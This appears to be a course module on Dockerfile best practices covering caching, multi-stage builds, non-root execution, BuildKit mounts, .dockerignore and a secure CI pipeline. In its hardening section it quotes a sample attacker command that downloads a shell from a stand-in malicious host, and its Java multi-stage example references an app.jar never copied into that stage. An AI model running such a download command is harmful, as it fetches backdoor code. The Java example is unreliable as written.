# Module 2: Dockerfile Best Practices & Build Optimization

## Introduction: The Cost of Ignorance

Writing a Dockerfile that "works" takes five minutes. Writing a Dockerfile that is secure, cache-optimized, and production-ready requires deep understanding of the Docker build engine and image layer architecture.

A poorly constructed 1GB Node.js image deployed across a Kubernetes cluster of 100 nodes creates massive operational drag:
- **Deployment Latency:** Pulling 1GB takes minutes. In a scaling event responding to traffic spikes, minutes of latency result in dropped requests and customer outages.
- **Security Posture:** 1GB images contain compilers, package managers, and thousands of unnecessary binaries, drastically expanding the attack surface.
- **Financial Cost:** Storing, scanning, and transferring bloated images continuously inflates cloud bills.

This module deconstructs the `docker build` process. We will cover cache invalidation, layer optimization, multi-stage compilation, BuildKit advanced features, and security hardening. 

---

## 1. Instruction Anatomy: The Critical Differences

### `CMD` vs `ENTRYPOINT`
Both instructions define what happens when a container starts, but they interact differently.

- **`ENTRYPOINT`**: Defines the executable that will *always* run.
- **`CMD`**: Provides default arguments that are passed to the `ENTRYPOINT`. If no `ENTRYPOINT` is defined, `CMD` acts as the executable.

**Exec form vs Shell form:**
```dockerfile
# Anti-pattern: Shell Form
CMD node index.js
# Docker translates this to: /bin/sh -c "node index.js"
# PID 1 is the shell. The shell swallows SIGTERM signals. Your app won't gracefully shut down.

# Best Practice: Exec Form
CMD ["node", "index.js"]
# Your app is PID 1. It receives SIGTERM and can close connections cleanly.
```

### `COPY` vs `ADD`
Always use `COPY` unless you have a specific reason. 
`ADD` has magical powers: it can automatically extract `.tar.gz` files from the host into the container, and it can download files from URLs. However, using `ADD` with URLs is an anti-pattern because it does not clean up the downloaded archive, bloating the layer. Use `RUN curl ... && rm ...` instead.

### `ARG` vs `ENV`
- **`ARG` (Build-time):** Available only during `docker build`. Not persisted in the running container (though visible in `docker history`). Useful for passing versions or build flags.
- **`ENV` (Run-time):** Persisted in the final image configuration. Available to the running application.

---

## 2. Layer Caching Mechanics

Docker builds images incrementally. Every `RUN`, `COPY`, and `ADD` instruction creates a new intermediate image layer. Docker attempts to reuse cached layers to speed up builds.

### Cache Invalidation Rules
1. **Command string matching:** If you change `RUN echo "hello"` to `RUN echo "world"`, the cache is busted.
2. **File checksums:** For `COPY`, Docker calculates the SHA256 checksum of the files on the host. If one byte changes, the cache is busted.
3. **The Domino Effect:** If a layer's cache is invalidated, **ALL subsequent layers are automatically invalidated and rebuilt.**

### The Ordering Principle
To maximize cache hits, you must order instructions from least-frequently changed to most-frequently changed.

```dockerfile
# ANTI-PATTERN:
COPY . /app
RUN npm install
# Changing a typo in a README.md busts the cache for COPY. 
# This forces 'npm install' to run every single build, taking 5 minutes.

# BEST PRACTICE:
COPY package.json package-lock.json /app/
RUN npm ci
COPY . /app
# 'npm ci' is cached. It only rebuilds if the package.json changes.
# Changing code only busts the final COPY cache. Build takes 2 seconds.
```

### Chaining `RUN` Commands for Bloat Reduction
Union filesystems (OverlayFS) mean deleting a file in an upper layer does not erase it from the underlying layer.

```dockerfile
# ANTI-PATTERN: Creates 3 layers. 40MB index is permanently burned into layer 1.
RUN apt-get update
RUN apt-get install -y curl
RUN rm -rf /var/lib/apt/lists/*

# BEST PRACTICE: Creates 1 layer. Index is downloaded and deleted within the same layer execution.
RUN apt-get update && \
    apt-get install -y --no-install-recommends curl && \
    rm -rf /var/lib/apt/lists/*
```

---

## 3. Multi-Stage Builds Mastery

The single most powerful feature of Dockerfiles. It allows you to use a massive SDK environment to compile code, but only copy the final binary into a minimal production image.

### Production Go Multi-Stage Template
```dockerfile
# Stage 1: The Heavy Builder (800MB)
FROM golang:1.21-alpine AS builder
WORKDIR /src
COPY go.mod go.sum ./
RUN go mod download
COPY . .
# Compile a statically linked binary
RUN CGO_ENABLED=0 GOOS=linux go build -ldflags="-s -w" -o /bin/myapp main.go

# Stage 2: The Minimal Runner (5MB)
# Scratch is a perfectly empty filesystem. Ultimate security.
FROM scratch
# Copy only the compiled binary from Stage 1
COPY --from=builder /bin/myapp /myapp
# Optionally copy SSL certificates if making external API calls
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/
ENTRYPOINT ["/myapp"]
```

---

## 4. Container Security Hardening

### The Principle of Least Privilege: Non-Root Execution
By default, Docker runs applications as `root` (UID 0). If an attacker escapes the container, they hit the host OS as root. 
You must explicitly drop privileges.

```dockerfile
FROM node:20-slim
WORKDIR /app
# Create an explicit group and user with a known high UID
RUN groupadd -g 10001 nodejs && \
    useradd -u 10001 -g nodejs -s /bin/bash -m nodejs
COPY package.json .
RUN npm ci
COPY . .
# Change ownership
RUN chown -R nodejs:nodejs /app
# Drop privileges
USER 10001
CMD ["node", "server.js"]
```

### The Read-Only Root Filesystem
If an attacker achieves Remote Code Execution (RCE), they usually try to download a backdoor (`curl malicious.com/shell -o /tmp/shell`) or alter `/etc/passwd`.
You can prevent this by running the container in read-only mode (`docker run --read-only`).
If your application *must* write temporary files, mount an in-memory `tmpfs` volume over the required directory.

---

## 5. Advanced BuildKit Features

BuildKit is the modern build engine replacing the legacy builder. Ensure it is enabled (`export DOCKER_BUILDKIT=1`).

### Cache Mounts
Language package managers download hundreds of megabytes. Cache mounts allow you to persist this cache across builds without baking it into the image.
```dockerfile
# syntax=docker/dockerfile:1
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
# The pip cache is temporarily mounted during the RUN command.
RUN --mount=type=cache,target=/root/.cache/pip \
    pip install -r requirements.txt
```

### Secret Mounts
Never use `ARG` or `ENV` for SSH keys or API tokens. They are permanently leaked in the layer history. Use secret mounts.
```dockerfile
# syntax=docker/dockerfile:1
FROM alpine
# Mount the secret directly into the command execution context.
RUN --mount=type=secret,id=aws_creds \
    cat /run/secrets/aws_creds | my-auth-script.sh
```
*Run with:* `docker build --secret id=aws_creds,src=./creds.json .`

---

## 6. Vulnerability Scanning and CI/CD

Your image is not ready for production until it passes static analysis and vulnerability scanning.

### Hadolint (Dockerfile Linter)
Hadolint parses your Dockerfile and fails the build if you violate best practices (e.g., using `latest` tags, omitting `apt-get clean`, missing `USER` instruction).

### Trivy (Image Scanner)
Trivy scans the compiled image layer tarballs for known CVEs.
```bash
# Fail the CI pipeline if Critical vulnerabilities are found
trivy image --exit-code 1 --severity CRITICAL my-registry/myapp:latest
```

## Summary
A professional Dockerfile is highly structured. It leverages layer caching aggressively, minimizes the attack surface via multi-stage builds and distroless bases, enforces non-root execution, and integrates directly with BuildKit for rapid cache-mounting. Proceed to the `QnA.md` to drill these concepts.

---

## 7. Deep Dive: Full Production Multi-Stage Dockerfiles

### Python 3.12 (Poetry on Slim)
Python deployments often suffer from bloat because compilers are needed to build C-extensions, but not to run them. Multi-stage builds are critical here.

```dockerfile
# Stage 1: Builder
FROM python:3.12-slim AS builder
ENV POETRY_NO_INTERACTION=1 \
    POETRY_VIRTUALENVS_IN_PROJECT=1 \
    POETRY_VIRTUALENVS_CREATE=1 \
    POETRY_CACHE_DIR=/tmp/poetry_cache
WORKDIR /app
# Install build dependencies
RUN apt-get update && apt-get install -y --no-install-recommends build-essential
RUN pip install poetry
COPY pyproject.toml poetry.lock ./
# Cache mount for Poetry
RUN --mount=type=cache,target=$POETRY_CACHE_DIR poetry install --no-root

# Stage 2: Runtime
FROM python:3.12-slim
WORKDIR /app
ENV PATH="/app/.venv/bin:$PATH"
# Create non-root user
RUN groupadd -g 10001 pythonapp && useradd -u 10001 -g pythonapp -s /bin/bash -m pythonapp
# Copy virtual environment from builder
COPY --from=builder /app/.venv ./.venv
COPY . .
RUN chown -R pythonapp:pythonapp /app
USER 10001
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

### Node.js 20 (Next.js Standalone on Distroless)
Distroless images contain no shell, package manager, or standard utilities. They are strictly the application and its language runtime.

```dockerfile
# Stage 1: Dependencies
FROM node:20-alpine AS deps
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci

# Stage 2: Builder
FROM node:20-alpine AS builder
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY . .
RUN npm run build

# Stage 3: Runner
# Use Google's distroless base image for ultimate security
FROM gcr.io/distroless/nodejs20-debian11
WORKDIR /app
ENV NODE_ENV production
# Next.js standalone output contains only production dependencies
COPY --from=builder /app/.next/standalone ./
COPY --from=builder /app/.next/static ./.next/static
COPY --from=builder /app/public ./public
# Run command
CMD ["server.js"]
```

### Java 21 (Spring Boot with jlink)
Java applications traditionally ship with a full JRE. With `jlink`, you can create a custom, stripped-down Java runtime containing only the modules your application actually needs.

```dockerfile
# Stage 1: Build the JAR
FROM eclipse-temurin:21-jdk-jammy AS builder
WORKDIR /workspace
COPY . .
RUN ./gradlew bootJar

# Stage 2: Create Custom JRE
FROM eclipse-temurin:21-jdk-jammy AS jre-builder
# Determine necessary modules using jdeps
RUN jdeps --ignore-missing-deps -q  \
    --recursive  \
    --multi-release 21  \
    --print-module-deps  \
    --class-path 'BOOT-INF/lib/*'  \
    app.jar > modules.txt
# Build custom JRE
RUN jlink \
    --add-modules $(cat modules.txt) \
    --strip-debug \
    --no-man-pages \
    --no-header-files \
    --compress=2 \
    --output /customjre

# Stage 3: Runtime
FROM debian:bookworm-slim
ENV JAVA_HOME=/jre
ENV PATH="${JAVA_HOME}/bin:${PATH}"
COPY --from=jre-builder /customjre $JAVA_HOME
RUN groupadd -g 10001 javaapp && useradd -u 10001 -g javaapp -s /bin/bash -m javaapp
USER 10001
WORKDIR /app
COPY --from=builder /workspace/build/libs/app.jar app.jar
CMD ["java", "-jar", "app.jar"]
```

---

## 8. BuildKit Advanced Features in Depth

### Cache Mounts
Cache mounts (`--mount=type=cache`) allow a directory in the build container to persist between builds. This is revolutionary for package managers like `npm`, `pip`, `maven`, or `go`. Without this, changing a single line in `package.json` forces `npm` to download every single dependency from scratch. With a cache mount, `npm` pulls from the local cache on the Docker host, reducing rebuild times from minutes to seconds.

### Secret Mounts and SSH Forwarding
Sometimes builds require accessing private repositories via SSH or providing API tokens to pull private packages.
- **SSH Forwarding:** `--mount=type=ssh` securely forwards the Docker host's SSH agent into the build container. The SSH keys are never written to the container filesystem.
```dockerfile
# syntax=docker/dockerfile:1
FROM alpine
RUN apk add --no-cache openssh-client git
# Allow git to use the forwarded ssh agent
RUN mkdir -p -m 0700 ~/.ssh && ssh-keyscan github.com >> ~/.ssh/known_hosts
RUN --mount=type=ssh git clone git@github.com:myorg/private-repo.git
```

### Multi-Platform `docker buildx` Cross-Compilation
In an era of ARM processors (Apple Silicon, AWS Graviton), building images for multiple architectures is required.
BuildKit supports cross-compilation natively.
```bash
# Create a builder instance capable of multi-platform builds
docker buildx create --use --name mybuilder

# Build and push simultaneously for both architectures
docker buildx build --platform linux/amd64,linux/arm64 -t myrepo/myapp:latest --push .
```
This single command leverages QEMU emulation or cross-compilation toolchains to produce an OCI image index (manifest list) containing both architectures, pushing it directly to the registry.

---

## 9. The `.dockerignore` File

The `.dockerignore` file operates identically to `.gitignore`. It is the single most effective way to reduce the build context size, which directly impacts build performance and security.

### Comprehensive `.dockerignore` Template
```text
# Git
.git
.gitignore

# Environments
.env
.venv
env/
venv/

# Node
node_modules/
npm-debug.log

# Build Outputs
dist/
build/
*.pyc
__pycache__/

# Docker
Dockerfile
.dockerignore
```
**Why is this critical?**
If you execute `COPY . /app` without a `.dockerignore`, Docker will copy your entire `.git` history (which could be gigabytes) and your local `node_modules` (which contain host-specific binaries) into the image context. This slows down the `docker build` daemon transfer and creates bloated, potentially broken layers.

---

## 10. The Complete CI/CD Security Pipeline

Building a secure container involves integrating specialized tools into your CI/CD pipeline (e.g., GitHub Actions, GitLab CI).

1.  **Linting (Hadolint):** Runs on pull requests. Ensures developers are using `COPY` instead of `ADD`, pinning versions (no `latest` tags), and running as a non-root user.
2.  **Building (Buildx):** Compiles the image.
3.  **SBOM Generation (Grype or Syft):** Generates a Software Bill of Materials (SBOM) in SPDX or CycloneDX format. This is a comprehensive inventory of every package and library inside the container. Essential for compliance.
    ```bash
    syft packages myrepo/myapp:latest -o spdx-json > sbom.json
    ```
4.  **Vulnerability Scanning (Trivy):** Scans the image layers against vulnerability databases (NVD) to detect known CVEs (Common Vulnerabilities and Exposures).
5.  **Signing (Cosign):** Cryptographically signs the container image. Kubernetes clusters can use tools like Kyverno or OPA Gatekeeper to verify this signature before allowing the pod to run, ensuring the image was not tampered with in the registry.
    ```bash
    cosign sign --key cosign.key myrepo/myapp:latest
    ```
By mastering these techniques, you transform Docker from a simple packaging tool into a robust, secure software supply chain mechanism.

---

## 11. Ephemeral Build Environments with Compose

While multi-stage Dockerfiles handle the mechanics of building a production image, developers still need a way to run the build environment locally without executing `docker build` repeatedly during active development.
This is where `docker-compose` shines as an orchestrator for developer environments.

```yaml
version: '3.8'
services:
  app-dev:
    build:
      context: .
      target: builder # Target the first stage of a multi-stage build
    volumes:
      - .:/app # Mount local source code
      - /app/node_modules # Anonymous volume to preserve node_modules
    command: npm run dev
    ports:
      - "3000:3000"
```
This configuration allows developers to utilize the exact same base image and OS dependencies defined in the Dockerfile's builder stage, but dynamically maps their local code into the container, enabling hot-reloading without rebuilding layers.

---

## 12. Troubleshooting the Build Cache

One of the most frustrating experiences is when Docker refuses to cache a layer, forcing long rebuilds.
Common culprits include:
1. **Unstable `COPY` instructions:** If you `COPY . .`, any modified file (even a log file or a README) invalidates the cache. Always copy only what is strictly necessary.
2. **Timestamps:** Docker calculates checksums based on file content and metadata. Changing file modification times without changing content can sometimes trigger rebuilds depending on the storage driver.
3. **External Dependencies:** Instructions like `RUN apt-get update` fetch metadata from the internet. The command string itself hasn't changed, but the results of the command will. BuildKit improves upon this by allowing cache mounts to persist downloaded artifacts, but the instruction execution still must be managed carefully.

### Using `--no-cache` and `--pull`
When resolving build issues, it is often necessary to force a clean slate:
- `docker build --no-cache .` ensures no layers are reused.
- `docker build --pull .` forces the daemon to query the remote registry for a newer version of the `FROM` image, ensuring you have the latest security patches before building your layers on top of it.

---

## 13. Understanding the Image Manifest and OCI Artifacts

When you push a built image to a registry like Docker Hub or Amazon ECR, you are not just pushing a single tarball. You are pushing a collection of objects defined by the OCI Image Specification.

### The Components
1. **Layer Blobs:** The actual `.tar.gz` files containing the filesystem differences.
2. **Image Configuration:** A JSON file containing the `ENV`, `ENTRYPOINT`, and `CMD` definitions, as well as the history of how the image was built.
3. **The Manifest:** A JSON document that ties it all together. It provides the checksums (digests) of the configuration file and all the layer blobs.

```json
{
  "schemaVersion": 2,
  "config": {
    "mediaType": "application/vnd.oci.image.config.v1+json",
    "digest": "sha256:d8a2...3f"
  },
  "layers": [
    {
      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
      "digest": "sha256:4d2c...8a",
      "size": 524385
    }
  ]
}
```

### OCI Artifacts
Because a container registry is fundamentally just a secure, content-addressable storage system that understands manifests and blobs, you can store more than just container images. 
Modern registries support **OCI Artifacts**. You can use registries to store:
- Helm Charts
- Open Policy Agent (OPA) bundles
- WebAssembly (Wasm) modules
- SBOMs and Cosign signatures (attached directly to the image manifest)

This unifies the entire supply chain, allowing you to manage deployments and security metadata with the exact same `docker pull` / `docker push` mechanics.

---

## 14. Advanced Dockerfile Optimization: `.dockerignore` Deep Dive

The `.dockerignore` file is often misunderstood as just a way to save a few megabytes. In reality, it is a critical security and performance mechanism.

### The Build Context Bottleneck
When you run `docker build -t myapp .`, the Docker CLI does not execute the build. It streams the entire current directory (the "build context") to the Docker daemon. If the daemon is remote (like on a CI server or Docker Desktop VM), this happens over a network socket.

If you have a 2GB `node_modules` folder and a 1GB `.git` directory, the CLI will spend minutes archiving and transferring 3GB of data before the first `FROM` instruction is even parsed.

### Security Implications
If you execute `COPY . /app` without ignoring `.git/`, your entire source code history is burned into the image. An attacker who pulls the image can simply `docker run myapp git log` or extract deleted secrets from the commit history.
Similarly, `.env` files containing local development database passwords will be copied into the final image.

### Pattern Matching Rules
The `.dockerignore` uses Go's `filepath.Match` rules.
- `*/temp*` ignores files starting with `temp` in any immediate subdirectory.
- `*/*/temp*` ignores files starting with `temp` two levels down.
- `**/*.md` ignores all markdown files anywhere in the tree.
- `!README.md` (Exception rule) allows the `README.md` to be included even if a previous rule excluded it.

Always start with a "deny-all" approach for maximum security:
```text
# Ignore everything
**/*

# Explicitly allow what is needed
!src/
!package.json
!package-lock.json
!tsconfig.json
```
This whitelist approach guarantees that new files added to the repository later will not accidentally leak into the production container.

---

## 15. The Future: Rootless BuildKit and Alternative Builders

Running `docker build` traditionally requires a daemon running as root. This is a massive security risk in shared CI/CD environments like Jenkins or GitLab Runners, where a malicious Dockerfile could potentially compromise the host node.

### Rootless BuildKit
BuildKit can run in "rootless" mode. By leveraging User Namespaces, the `buildkitd` daemon runs as an unprivileged user on the host. Inside the user namespace, it maps to UID 0 (root), allowing it to execute package managers and configure layers. If the build process breaks out, it has no privileges on the host.

### Daemonless Builders
Tools like **Kaniko** (by Google) and **Buildah** (by Red Hat) take this a step further by eliminating the daemon entirely.
- **Kaniko:** Executes Dockerfile instructions completely in user-space inside a container. It unpacks the filesystem, executes the command, and snapshots the filesystem differences to create the next layer, without ever needing privileged access to the kernel's OverlayFS or cgroups.
- **Buildah:** Allows building OCI images without a Dockerfile using bash scripts, giving unparalleled flexibility for generating dynamic container layers.

While Docker remains the standard developer tool, understanding these alternative engines is crucial for architecting secure, scalable CI/CD pipelines in enterprise Kubernetes environments.

---

## 16. Practical Implementation: GitHub Actions CI/CD Pipeline

To tie all these concepts together, here is a complete GitHub Actions workflow demonstrating a secure, optimized build pipeline that utilizes BuildKit, layer caching, and vulnerability scanning.

```yaml
name: Build and Push Secure Image

on:
  push:
    branches: [ "main" ]

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      security-events: write

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Docker Buildx
        uses: docker/setup-buildx-action@v3
        with:
          # Enable BuildKit features explicitly
          buildkitd-flags: --debug

      - name: Log into registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata (tags, labels)
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=sha,format=long
            type=raw,value=latest,enable={{is_default_branch}}

      - name: Build and push Docker image
        id: build-and-push
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          # Enables multi-stage caching and cache mounts

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:latest
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: Upload Trivy scan results to GitHub Security tab
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'trivy-results.sarif'
```

### Key Optimizations in this Pipeline:
1. **`setup-buildx-action`:** Initializes a dedicated BuildKit builder instance, unlocking all the advanced `--mount=type=cache` features defined in our Dockerfiles.
2. **`cache-from: type=gha`:** Integrates directly with the GitHub Actions Cache API. Instead of pulling cache layers from a slow container registry, it uses the incredibly fast internal GHA network, dramatically speeding up multi-stage builds.
3. **`trivy-action`:** Enforces our security standards automatically. By generating a SARIF report, the vulnerabilities are natively displayed in the GitHub Security tab, providing immediate feedback to developers without requiring external dashboards.

This pipeline represents the industry standard for transforming the Dockerfile from a simple script into a robust, secure software supply chain artifact.
